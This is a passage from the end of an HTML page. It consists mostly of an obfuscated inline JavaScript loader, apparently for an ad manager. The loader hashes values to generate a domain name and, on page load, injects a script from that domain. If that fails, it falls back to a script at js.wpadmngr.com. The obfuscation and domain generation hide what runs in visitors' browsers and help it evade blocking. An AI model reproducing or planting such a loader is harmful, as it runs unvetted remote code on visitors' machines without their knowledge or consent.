4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>